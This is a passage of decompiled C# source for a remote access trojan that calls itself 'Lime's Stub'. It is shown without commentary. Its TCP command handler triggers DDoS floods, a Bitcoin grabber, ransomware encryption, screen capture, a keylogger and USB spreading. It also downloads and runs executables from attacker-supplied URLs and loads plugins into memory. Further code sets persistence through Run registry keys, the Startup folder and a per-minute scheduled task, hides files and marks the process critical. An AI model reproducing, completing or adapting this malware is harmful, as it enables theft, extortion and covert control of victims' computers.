					object obj4 = new WindowsPrincipal((WindowsIdentity)current4);
					if (!Conversions.ToBoolean(NewLateBinding.LateGet(obj4, (Type)null, "IsInRole", new object[1] { WindowsBuiltInRole.Administrator }, (string[])null, (Type[])null, (bool[])null)))
					{
						smethod_26("MSG" + string_12 + "EnableCMD: Lime's Stub is not running as administrator");
					}
					else
					{
						((ServerComputer)Class3.Class2_0).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\System", "DisableCMD", (object)"0", RegistryValueKind.DWord);
					}
					break;
				}
				case "OpenWebpage":
					Process.Start(array[1]);
					break;
				case "ddos.ARME.start":
					ARME.smethod_0(array[1], 10, 21600, "");
					break;
				case "SetClp":
				{
					Thread thread = new Thread(delegate(object a0)
					{
						Clipboard.SetText(Conversions.ToString(a0));
					});
					thread.SetApartmentState(ApartmentState.STA);
					thread.Start(array[1]);
					smethod_26("MSG" + string_12 + "Clipboard copied successfully!");
					break;
				}
				case "botk":
					Class8.smethod_0();
					smethod_26("MSG" + string_12 + "Malware Killer ran successfully!");
					break;
				case "BitcoinON":
					if (!bool_0)
					{
						smethod_26("MSG" + string_12 + "BitcoinGrabber was not checked when stub created!");
						return;
					}
					bitgrb.Start();
					Interaction.SaveSetting("Lime", "SU", "btc", "1");
					smethod_26("MSG" + string_12 + "BitcoinGrabber started successfully!");
					break;
				case "Rware":
				{
					string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
					if (File.Exists(folderPath + "\\Microsoft\\MMC\\hash"))
					{
						smethod_26("MSG" + string_12 + "Ransomware: The client is already encrypted");
						return;
					}
					Rware rware = new Rware();
					rware.GenKey();
					break;
				}
				case "pcspecs":
					smethod_26("MSG" + string_12 + "CPU: " + smethod_15() + " || GPU: " + smethod_16() + " || RAM: " + Strings.Format((object)((double)((ServerComputer)Class3.Class2_0).get_Info().get_TotalPhysicalMemory() / 1024.0 / 1024.0 / 1024.0), "###,###,##0 GB"));
					break;
				case "prof":
					switch (array[1])
					{
					case "@":
						smethod_6(array[2]);
						break;
					case "!":
						smethod_28(array[2], array[3], RegistryValueKind.String);
						smethod_26(Conversions.ToString(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject((object)("getvalue" + string_12 + array[1] + string_12), RuntimeHelpers.GetObjectValue(smethod_13(array[1], ""))))));
						break;
					case "~":
						smethod_28(array[2], array[3], RegistryValueKind.String);
						break;
					}
					return;
				case "ShowBar":
				{
					string string_2 = "Shell_traywnd";
					string string_3 = "";
					int int_ = FindWindowA(ref string_2, ref string_3);
					SetWindowPos(int_, 0, 0, 0, 0, 0, 64);
					break;
				}
				case "BlockWebpage":
				{
					object current2 = WindowsIdentity.GetCurrent();
					object obj2 = new WindowsPrincipal((WindowsIdentity)current2);
					if (!Conversions.ToBoolean(NewLateBinding.LateGet(obj2, (Type)null, "IsInRole", new object[1] { WindowsBuiltInRole.Administrator }, (string[])null, (Type[])null, (bool[])null)))
					{
						smethod_26("MSG" + string_12 + "Block Webpage: Lime's Stub is not running as administrator");
						break;
					}
					((ServerComputer)Class3.Class2_0).get_FileSystem().WriteAllText("C:\\WINDOWS\\system32\\drivers\\etc\\hosts", "\r\n127.0.0.1  " + array[1], true);
					smethod_26("MSG" + string_12 + "Webpage " + array[1] + " Blocked successfully!");
					break;
				}
				case "antiproc":
					MyAntiProcess.AutoAnti();
					MyAntiProcess.Start();
					Interaction.SaveSetting("Lime", "SU", "anti", "1");
					smethod_26("MSG" + string_12 + "Anti Process started!");
					break;
				case "searchwallet":
					smethod_26(("MSG" + string_12 + "Installed Wallet: " + smethod_11()) ?? "");
					break;
				}
				if (Operators.CompareString(text, "rn", false) != 0)
				{
					switch (text)
					{
					case "un":
						switch (array[1])
						{
						case "@":
							smethod_23(0);
							Process.Start(fileInfo_0.FullName);
							ProjectData.EndApp();
							break;
						case "!":
							smethod_23(0);
							ProjectData.EndApp();
							break;
						case "~":
							smethod_29();
							break;
						}
						return;
					case "CAP":
					{
						Rectangle bounds = Screen.get_PrimaryScreen().get_Bounds();
						Bitmap val2 = new Bitmap(Screen.get_PrimaryScreen().get_Bounds().Width, bounds.Height, (PixelFormat)135173);
						Graphics val3 = Graphics.FromImage((Image)(object)val2);
						Size size = new Size(((Image)val2).get_Width(), ((Image)val2).get_Height());
						val3.CopyFromScreen(0, 0, 0, 0, size, (CopyPixelOperation)13369376);
						try
						{
							size = new Size(32, 32);
							bounds = new Rectangle(Cursor.get_Position(), size);
							Cursors.get_Default().Draw(val3, bounds);
						}
						catch (Exception ex7)
						{
							ProjectData.SetProjectError(ex7);
							Exception projectError12 = ex7;
							ProjectData.SetProjectError(projectError12);
							ProjectData.ClearProjectError();
							ProjectData.ClearProjectError();
						}
						val3.Dispose();
						Bitmap val4 = new Bitmap(Conversions.ToInteger(array[1]), Conversions.ToInteger(array[2]));
						val3 = Graphics.FromImage((Image)(object)val4);
						val3.DrawImage((Image)(object)val2, 0, 0, ((Image)val4).get_Width(), ((Image)val4).get_Height());
						val3.Dispose();
						MemoryStream memoryStream5 = new MemoryStream();
						string string_8 = "CAP" + string_12;
						byte_1 = smethod_25(ref string_8);
						memoryStream5.Write(byte_1, 0, byte_1.Length);
						MemoryStream memoryStream6 = new MemoryStream();
						((Image)val4).Save((Stream)memoryStream6, ImageFormat.get_Jpeg());
						string text6 = smethod_21(memoryStream6.ToArray());
						if (Operators.CompareString(text6, Class6.string_6, false) != 0)
						{
							Class6.string_6 = text6;
							memoryStream5.Write(memoryStream6.ToArray(), 0, (int)memoryStream6.Length);
						}
						else
						{
							memoryStream5.WriteByte(0);
						}
						smethod_27(memoryStream5.ToArray());
						memoryStream5.Dispose();
						memoryStream6.Dispose();
						((Image)val2).Dispose();
						((Image)val4).Dispose();
						return;
					}
					case "ret":
					{
						byte[] array13 = (byte[])smethod_13(array[1], new byte[0]);
						if ((array[2].Length < 10) & (array13.Length == 0))
						{
							smethod_26("pl" + string_12 + array[1] + string_12 + Conversions.ToString(1));
							return;
						}
						if (array[2].Length > 10)
						{
							MemoryStream memoryStream7 = new MemoryStream();
							int length5 = (array[0] + string_12 + array[1] + string_12).Length;
							memoryStream7.Write(byte_1, length5, byte_1.Length - length5);
							array13 = smethod_30(memoryStream7.ToArray());
							smethod_28(array[1], array13, RegistryValueKind.Binary);
						}
						smethod_26("pl" + string_12 + array[1] + string_12 + Conversions.ToString(0));
						object objectValue4 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(smethod_22(array13, "A")));
						string[] obj8 = new string[5]
						{
							"ret",
							string_12,
							array[1],
							string_12,
							null
						};
						string string_8 = Conversions.ToString(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue4), (Type)null, "GT", new object[0], (string[])null, (Type[])null, (bool[])null)));
						obj8[4] = smethod_8(ref string_8);
						smethod_26(string.Concat(obj8));
						return;
					}
					case "inv":
					{
						byte[] array12 = (byte[])smethod_13(array[1], new byte[0]);
						if ((array[3].Length < 10) & (array12.Length == 0))
						{
							smethod_26("pl" + string_12 + array[1] + string_12 + Conversions.ToString(1));
							return;
						}
						if (array[3].Length > 10)
						{
							MemoryStream memoryStream4 = new MemoryStream();
							int length4 = (array[0] + string_12 + array[1] + string_12 + array[2] + string_12).Length;
							memoryStream4.Write(byte_1, length4, byte_1.Length - length4);
							array12 = smethod_30(memoryStream4.ToArray());
							smethod_28(array[1], array12, RegistryValueKind.Binary);
						}
						smethod_26("pl" + string_12 + array[1] + string_12 + Conversions.ToString(0));
						object objectValue3 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(smethod_22(array12, "A")));
						NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue3), (Type)null, "h", new object[1] { Class6.string_5 }, (string[])null, (Type[])null);
						NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue3), (Type)null, "p", new object[1] { Class6.string_7 }, (string[])null, (Type[])null);
						NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue3), (Type)null, "osk", new object[1] { array[2] }, (string[])null, (Type[])null);
						NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(objectValue3), (Type)null, "start", new object[0], (string[])null, (Type[])null, (bool[])null, true);
						while (!Conversions.ToBoolean(RuntimeHelpers.GetObjectValue(Operators.OrObject((object)(!bool_2), RuntimeHelpers.GetObjectValue(Operators.CompareObjectEqual(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue3), (Type)null, "Off", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)true, false))))))
						{
							Thread.Sleep(1);
						}
						NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue3), (Type)null, "off", new object[1] { true }, (string[])null, (Type[])null);
						return;
					}
					}
					if (Operators.CompareString(text, "up", false) != 0)
					{
						if (Operators.CompareString(text, "Ex", false) == 0)
						{
							if (object_0 == null)
							{
								smethod_26("PLG");
								int num2 = 0;
								while (!(unchecked(object_0 != null || num2 == 20) | !bool_2))
								{
									num2++;
									Thread.Sleep(1000);
								}
								if ((object_0 == null) | !bool_2)
								{
									return;
								}
							}
							object[] array14 = new object[1] { byte_1 };
							bool[] array15 = new bool[1] { true };
							NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(object_0), (Type)null, "ind", array14, (string[])null, (Type[])null, array15, true);
							if (array15[0])
							{
								byte_1 = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array14[0])), typeof(byte[]));
							}
						}
						else if (Operators.CompareString(text, "PLG", false) == 0)
						{
							MemoryStream memoryStream8 = new MemoryStream();
							int length6 = (array[0] + string_12).Length;
							memoryStream8.Write(byte_1, length6, byte_1.Length - length6);
							object_0 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(smethod_22(smethod_30(memoryStream8.ToArray()), "A")));
							NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(object_0), (Type)null, "H", new object[1] { Class6.string_5 }, (string[])null, (Type[])null);
							NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(object_0), (Type)null, "P", new object[1] { Class6.string_7 }, (string[])null, (Type[])null);
							NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(object_0), (Type)null, "c", new object[1] { tcpClient_0 }, (string[])null, (Type[])null);
						}
						return;
					}
					byte[] array16 = null;
					if (array[1][0] == '\u001f')
					{
						try
						{
							MemoryStream memoryStream9 = new MemoryStream();
							int length7 = (array[0] + string_12).Length;
							memoryStream9.Write(byte_1, length7, byte_1.Length - length7);
							array16 = smethod_30(memoryStream9.ToArray());
						}
						catch (Exception ex8)
						{
							ProjectData.SetProjectError(ex8);
							Exception projectError13 = ex8;
							ProjectData.SetProjectError(projectError13);
							smethod_26("MSG" + string_12 + "Update ERROR");
							smethod_26("bla");
							ProjectData.ClearProjectError();
							ProjectData.ClearProjectError();
							return;
						}
					}
					else
					{
						WebClient webClient = new WebClient();
						try
						{
							array16 = webClient.DownloadData(array[1]);
						}
						catch (Exception ex9)
						{
							ProjectData.SetProjectError(ex9);
							Exception projectError14 = ex9;
							ProjectData.SetProjectError(projectError14);
							smethod_26("MSG" + string_12 + "Update ERROR");
							smethod_26("bla");
							ProjectData.ClearProjectError();
							ProjectData.ClearProjectError();
							return;
						}
					}
					smethod_26("bla");
					string text7 = Path.GetTempFileName() + ".exe";
					try
					{
						smethod_26("MSG" + string_12 + "Updating To " + new FileInfo(text7).get_Name());
						Thread.Sleep(2000);
						File.WriteAllBytes(text7, array16);
						Process.Start(text7, "..");
					}
					catch (Exception ex10)
					{
						ProjectData.SetProjectError(ex10);
						Exception ex11 = ex10;
						ProjectData.SetProjectError(ex11);
						Exception ex12 = ex11;
						smethod_26("MSG" + string_12 + "Update ERROR " + ex12.Message);
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
						return;
					}
					smethod_29();
					return;
				}
				if (array[2][0] == '\u001f')
				{
					try
					{
						MemoryStream memoryStream10 = new MemoryStream();
						int length8 = (array[0] + string_12 + array[1] + string_12).Length;
						memoryStream10.Write(byte_1, length8, byte_1.Length - length8);
						bytes = smethod_30(memoryStream10.ToArray());
					}
					catch (Exception ex13)
					{
						ProjectData.SetProjectError(ex13);
						Exception projectError15 = ex13;
						ProjectData.SetProjectError(projectError15);
						smethod_26("MSG" + string_12 + "Execute ERROR");
						smethod_26("bla");
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
						return;
					}
				}
				else
				{
					WebClient webClient2 = new WebClient();
					try
					{
						bytes = webClient2.DownloadData(array[2]);
					}
					catch (Exception ex14)
					{
						ProjectData.SetProjectError(ex14);
						Exception projectError16 = ex14;
						ProjectData.SetProjectError(projectError16);
						smethod_26("MSG" + string_12 + "Download ERROR");
						smethod_26("bla");
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
						return;
					}
				}
				smethod_26("bla");
				string text8 = Path.GetTempFileName() + "." + array[1];
				try
				{
					File.WriteAllBytes(text8, bytes);
					Process.Start(text8);
					smethod_26("MSG" + string_12 + "Executed As " + new FileInfo(text8).get_Name());
				}
				catch (Exception ex15)
				{
					ProjectData.SetProjectError(ex15);
					Exception ex16 = ex15;
					ProjectData.SetProjectError(ex16);
					Exception ex17 = ex16;
					smethod_26("MSG" + string_12 + "Execute ERROR " + ex17.Message);
					ProjectData.ClearProjectError();
					ProjectData.ClearProjectError();
				}
			}
			catch (Exception ex18)
			{
				ProjectData.SetProjectError(ex18);
				Exception ex19 = ex18;
				ProjectData.SetProjectError(ex19);
				Exception ex20 = ex19;
				if (array.Length > 0 && ((Operators.CompareString(array[0], "Ex", false) == 0) | (Operators.CompareString(array[0], "PLG", false) == 0)))
				{
					object_0 = null;
				}
				try
				{
					smethod_26("ER" + string_12 + array[0] + string_12 + ex20.Message);
				}
				catch (Exception ex21)
				{
					ProjectData.SetProjectError(ex21);
					Exception projectError17 = ex21;
					ProjectData.SetProjectError(projectError17);
					ProjectData.ClearProjectError();
					ProjectData.ClearProjectError();
				}
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
		}
	}

	public static string smethod_18()
	{
		string text = "ll" + string_12;
		try
		{
			if (Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(smethod_13("vn", "")), (object)"", false))
			{
				string text2 = text;
				string string_ = smethod_5(ref string_10) + "_" + smethod_14();
				text = text2 + smethod_8(ref string_) + string_12;
			}
			else
			{
				string text3 = text;
				string string_2 = Conversions.ToString(RuntimeHelpers.GetObjectValue(smethod_13("vn", "")));
				string string_ = smethod_5(ref string_2) + "_" + smethod_14();
				text = text3 + smethod_8(ref string_) + string_12;
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception projectError = ex;
			ProjectData.SetProjectError(projectError);
			string text4 = text;
			string string_ = smethod_14();
			text = text4 + smethod_8(ref string_) + string_12;
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		try
		{
			text = text + Environment.MachineName + string_12;
		}
		catch (Exception ex2)
		{
			ProjectData.SetProjectError(ex2);
			Exception projectError2 = ex2;
			ProjectData.SetProjectError(projectError2);
			text = text + "??" + string_12;
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		try
		{
			text = text + Environment.UserName + string_12;
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3);
			Exception projectError3 = ex3;
			ProjectData.SetProjectError(projectError3);
			text = text + "??" + string_12;
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		try
		{
			text = text + fileInfo_0.LastWriteTime.Date.ToString("yy-MM-dd") + string_12;
		}
		catch (Exception ex4)
		{
			ProjectData.SetProjectError(ex4);
			Exception projectError4 = ex4;
			ProjectData.SetProjectError(projectError4);
			text = text + "??-??-??" + string_12;
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		text += string_12;
		try
		{
			text += ((ServerComputer)computer_0).get_Info().get_OSFullName().Replace("Microsoft", "")
				.Replace("Windows", "Win")
				.Replace("®", "")
				.Replace("™", "")
				.Replace("  ", " ")
				.Replace(" Win", "Win");
		}
		catch (Exception ex5)
		{
			ProjectData.SetProjectError(ex5);
			Exception projectError5 = ex5;
			ProjectData.SetProjectError(projectError5);
			text += "??";
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		text += "SP";
		try
		{
			string[] array = Strings.Split(Environment.OSVersion.ServicePack, " ", -1, (CompareMethod)0);
			if (array.Length == 1)
			{
				text += "0";
			}
			text += array[checked(array.Length - 1)];
		}
		catch (Exception ex6)
		{
			ProjectData.SetProjectError(ex6);
			Exception projectError6 = ex6;
			ProjectData.SetProjectError(projectError6);
			text += "0";
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		try
		{
			text = ((!Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Contains("x86")) ? (text + " x86" + string_12) : (text + " x64" + string_12));
		}
		catch (Exception ex7)
		{
			ProjectData.SetProjectError(ex7);
			Exception projectError7 = ex7;
			ProjectData.SetProjectError(projectError7);
			text += string_12;
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		text = ((!smethod_9()) ? (text + "No" + string_12) : (text + "Yes" + string_12));
		text = text + smethod_12() + string_12 + ".." + string_12 + smethod_10() + string_12;
		string text5 = "";
		try
		{
			string[] valueNames = ((ServerComputer)computer_0).get_Registry().get_CurrentUser().CreateSubKey("Software\\" + string_8, RegistryKeyPermissionCheck.Default)
				.GetValueNames();
			foreach (string text6 in valueNames)
			{
				if (text6.Length == 32)
				{
					text5 = text5 + text6 + ",";
				}
			}
		}
		catch (Exception ex8)
		{
			ProjectData.SetProjectError(ex8);
			Exception projectError8 = ex8;
			ProjectData.SetProjectError(projectError8);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		return text + text5;
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void smethod_19()
	{
		Thread.Sleep(1000);
		if (bool_3 && !smethod_3(fileInfo_0, new FileInfo(Interaction.Environ(string_3).ToLower() + "\\" + string_4.ToLower())))
		{
			try
			{
				if (File.Exists(Interaction.Environ(string_3) + "\\" + string_4))
				{
					File.Delete(Interaction.Environ(string_3) + "\\" + string_4);
				}
				FileStream fileStream = new FileStream(Interaction.Environ(string_3) + "\\" + string_4, FileMode.CreateNew);
				byte[] array = File.ReadAllBytes(fileInfo_0.FullName);
				fileStream.Write(array, 0, array.Length);
				fileStream.Flush();
				fileStream.Close();
				fileInfo_0 = new FileInfo(Interaction.Environ(string_3) + "\\" + string_4);
				Process.Start(fileInfo_0.FullName);
				ProjectData.EndApp();
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception projectError = ex;
				ProjectData.SetProjectError(projectError);
				ProjectData.EndApp();
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
		}
		if (Conversions.ToBoolean((object)bool_9))
		{
			File.SetAttributes(Interaction.Environ(string_3) + "\\" + string_4, FileAttributes.Hidden);
		}
		try
		{
			Environment.SetEnvironmentVariable("SEE_MASK_NOZONECHECKS", "1", EnvironmentVariableTarget.User);
		}
		catch (Exception ex2)
		{
			ProjectData.SetProjectError(ex2);
			Exception projectError2 = ex2;
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		if (bool_7)
		{
			try
			{
				((ServerComputer)computer_0).get_Registry().get_CurrentUser().OpenSubKey(string_9, writable: true)!.SetValue(string_8, "\"" + fileInfo_0.FullName + "\" ..");
			}
			catch (Exception ex3)
			{
				ProjectData.SetProjectError(ex3);
				Exception projectError3 = ex3;
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
			try
			{
				((ServerComputer)computer_0).get_Registry().get_LocalMachine().OpenSubKey(string_9, writable: true)!.SetValue(string_8, "\"" + fileInfo_0.FullName + "\" ..");
			}
			catch (Exception ex4)
			{
				ProjectData.SetProjectError(ex4);
				Exception projectError4 = ex4;
				ProjectData.SetProjectError(projectError4);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
		}
		if (bool_5)
		{
			try
			{
				File.Copy(fileInfo_0.FullName, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + string_8, overwrite: true);
			}
			catch (Exception ex5)
			{
				ProjectData.SetProjectError(ex5);
				Exception projectError5 = ex5;
				ProjectData.SetProjectError(projectError5);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
		}
		if (Conversions.ToBoolean((object)bool_9))
		{
			File.SetAttributes(Application.get_ExecutablePath(), FileAttributes.Hidden);
		}
		try
		{
			((ServerComputer)Class3.Class2_0).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", (object)0);
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void smethod_20()
	{
		//IL_0268: Unknown result type (might be due to invalid IL or missing references)
		//IL_0272: Expected O, but got Unknown
		//IL_02b5: Unknown result type (might be due to invalid IL or missing references)
		checked
		{
			Thread.Sleep((int)Math.Round(Math.Round(Math.Round(Conversions.ToDouble(string_1) * 1000.0))));
			try
			{
				string setting = Interaction.GetSetting("Lime", "SU", "anti", "");
				if (setting.EndsWith("1"))
				{
					MyAntiProcess.AutoAnti();
					MyAntiProcess.Start();
				}
				else if (setting.EndsWith("0"))
				{
					bool_4 = false;
				}
				else if (bool_4)
				{
					MyAntiProcess.AutoAnti();
					MyAntiProcess.Start();
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			try
			{
				string setting2 = Interaction.GetSetting("Lime", "SU", "btc", "");
				if (setting2.EndsWith("1"))
				{
					bitgrb.Start();
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			if (bool_8)
			{
				try
				{
					Class8.smethod_0();
					Thread.Sleep(50);
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
			}
			if (bool_6)
			{
				SPUSB.Enable();
			}
			if (bool_10)
			{
				try
				{
					object executablePath = Application.get_ExecutablePath();
					Interaction.Shell("schtasks /Delete /tn NYAN /F", (AppWinStyle)0, false, -1);
					Thread.Sleep(100);
					Interaction.Shell(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"schtasks /create /tn NYAN /tr \"", executablePath), (object)"\" /sc minute /mo 1")), (AppWinStyle)0, false, -1);
				}
				catch (Exception projectError4)
				{
					ProjectData.SetProjectError(projectError4);
					ProjectData.ClearProjectError();
				}
			}
			if (Interaction.Command() != null)
			{
				try
				{
					((ServerComputer)computer_0).get_Registry().get_CurrentUser().SetValue("di", "!");
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception projectError5 = ex;
					ProjectData.SetProjectError(projectError5);
					ProjectData.ClearProjectError();
					ProjectData.ClearProjectError();
				}
				Thread.Sleep(5000);
			}
			bool createdNew = false;
			mutex_0 = new Mutex(initiallyOwned: true, string_8, out createdNew);
			if (!createdNew)
			{
				ProjectData.EndApp();
			}
			smethod_19();
			if (!bool_3)
			{
				string_4 = fileInfo_0.get_Name();
				string_3 = fileInfo_0.Directory!.get_Name();
			}
			Thread thread = new Thread(smethod_24, 1);
			thread.Start();
			try
			{
				kl_0 = new kl();
				Thread thread2 = new Thread(kl_0.WRK, 1);
				thread2.Start();
			}
			catch (Exception ex2)
			{
				ProjectData.SetProjectError(ex2);
				Exception projectError6 = ex2;
				ProjectData.SetProjectError(projectError6);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
			int num = 0;
			string text = "";
			if (bool_1)
			{
				try
				{
					SystemEvents.add_SessionEnding((SessionEndingEventHandler)delegate
					{
						smethod_7();
					});
					smethod_23(1);
				}
				catch (Exception ex3)
				{
					ProjectData.SetProjectError(ex3);
					Exception projectError7 = ex3;
					ProjectData.SetProjectError(projectError7);
					ProjectData.ClearProjectError();
					ProjectData.ClearProjectError();
				}
			}
			try
			{
				if (File.Exists(Path.GetTempPath() + "\\STSL.dat"))
				{
					YYPsAxmI7dZSplsSeU_002EJwtR5mUKvavTZvifev yYPsAxmI7dZSplsSeU_002EJwtR5mUKvavTZvifev = new YYPsAxmI7dZSplsSeU_002EJwtR5mUKvavTZvifev();
					((Form)yYPsAxmI7dZSplsSeU_002EJwtR5mUKvavTZvifev).ShowDialog();
				}
			}
			catch (Exception projectError8)
			{
				ProjectData.SetProjectError(projectError8);
				ProjectData.ClearProjectError();
			}
			while (true)
			{
				Thread.Sleep(1000);
				if (!bool_2)
				{
					text = "";
				}
				Application.DoEvents();
				try
				{
					num++;
					if (num == 5)
					{
						try
						{
							Process.GetCurrentProcess().MinWorkingSet = (IntPtr)1024;
						}
						catch (Exception ex4)
						{
							ProjectData.SetProjectError(ex4);
							Exception projectError9 = ex4;
							ProjectData.SetProjectError(projectError9);
							ProjectData.ClearProjectError();
							ProjectData.ClearProjectError();
						}
					}
					if (num >= 8)
					{
						num = 0;
						string text2 = smethod_10();
						if (Operators.CompareString(text, text2, false) != 0)
						{
							text = text2;
							smethod_26("act" + string_12 + text2);
						}
					}
					if (!bool_7)
					{
						continue;
					}
					try
					{
						if (Operators.ConditionalCompareObjectNotEqual(RuntimeHelpers.GetObjectValue(((ServerComputer)computer_0).get_Registry().get_CurrentUser().GetValue(string_9 + "\\" + string_8, "")), (object)("\"" + fileInfo_0.FullName + "\" .."), false))
						{
							((ServerComputer)computer_0).get_Registry().get_CurrentUser().OpenSubKey(string_9, writable: true)!.SetValue(string_8, "\"" + fileInfo_0.FullName + "\" ..");
						}
					}
					catch (Exception ex5)
					{
						ProjectData.SetProjectError(ex5);
						Exception projectError10 = ex5;
						ProjectData.SetProjectError(projectError10);
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
					try
					{
						if (Operators.ConditionalCompareObjectNotEqual(RuntimeHelpers.GetObjectValue(((ServerComputer)computer_0).get_Registry().get_LocalMachine().GetValue(string_9 + "\\" + string_8, "")), (object)("\"" + fileInfo_0.FullName + "\" .."), false))
						{
							((ServerComputer)computer_0).get_Registry().get_LocalMachine().OpenSubKey(string_9, writable: true)!.SetValue(string_8, "\"" + fileInfo_0.FullName + "\" ..");
						}
					}
					catch (Exception ex6)
					{
						ProjectData.SetProjectError(ex6);
						Exception projectError11 = ex6;
						ProjectData.SetProjectError(projectError11);
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
				}
				catch (Exception ex7)
				{
					ProjectData.SetProjectError(ex7);
					Exception projectError12 = ex7;
					ProjectData.SetProjectError(projectError12);
					ProjectData.ClearProjectError();
					ProjectData.ClearProjectError();
				}
			}
		}
	}

	public static string smethod_21(byte[] byte_1)
	{
		byte_1 = new MD5CryptoServiceProvider().ComputeHash(byte_1);
		string text = "";
		byte[] array = byte_1;
		foreach (byte b in array)
		{
			text += b.ToString("x2");
		}
		return text;
	}

	[DllImport("ntdll")]
	private static extern int NtSetInformationProcess(IntPtr intptr_0, int int_0, ref int int_1, int int_2);

	public static object smethod_22(byte[] byte_1, string string_13)
	{
		Module[] modules = Assembly.Load(byte_1).GetModules();
		foreach (Module module in modules)
		{
			Type[] types = module.GetTypes();
			foreach (Type type in types)
			{
				if (type.FullName!.EndsWith("." + string_13))
				{
					return module.Assembly.CreateInstance(type.FullName);
				}
			}
		}
		return null;
	}

	public static void smethod_23(int int_0)
	{
		try
		{
			NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref int_0, 4);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception projectError = ex;
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_24()
	{
		checked
		{
			while (true)
			{
				string_6 = "";
				if (tcpClient_0 != null)
				{
					long num = -1L;
					int num2 = 0;
					try
					{
						while (true)
						{
							IL_026d:
							num2++;
							if (num2 == 10)
							{
								num2 = 0;
								Thread.Sleep(1);
							}
							if (!bool_2)
							{
								break;
							}
							if (tcpClient_0.Available < 1)
							{
								tcpClient_0.Client.Poll(-1, SelectMode.SelectRead);
							}
							while (tcpClient_0.Available > 0)
							{
								if (num == -1L)
								{
									string text = "";
									while (true)
									{
										int num3 = tcpClient_0.GetStream().ReadByte();
										switch (num3)
										{
										case 0:
											num = Conversions.ToLong(text);
											text = "";
											if (num == 0L)
											{
												smethod_26("");
												num = -1L;
											}
											if (tcpClient_0.Available > 0)
											{
												goto IL_0167;
											}
											goto IL_026d;
										case -1:
											goto end_IL_0109;
										}
										text += Conversions.ToString(Conversions.ToInteger(Strings.ChrW(num3).ToString()));
										continue;
										end_IL_0109:
										break;
									}
									break;
								}
								byte_0 = new byte[tcpClient_0.Available + 1 - 1 + 1];
								long num4 = num - memoryStream_0.Length;
								if (byte_0.Length > num4)
								{
									byte_0 = new byte[(int)(num4 - 1L) + 1 - 1 + 1];
								}
								int count = tcpClient_0.Client.Receive(byte_0, 0, byte_0.Length, SocketFlags.None);
								memoryStream_0.Write(byte_0, 0, count);
								if (memoryStream_0.Length == num)
								{
									num = -1L;
									Thread thread = new Thread((ParameterizedThreadStart)delegate(byte[] byte_1)
									{
										smethod_17(byte_1);
									}, 1);
									thread.Start(memoryStream_0.ToArray());
									thread.Join(100);
									memoryStream_0.Dispose();
									memoryStream_0 = new MemoryStream();
								}
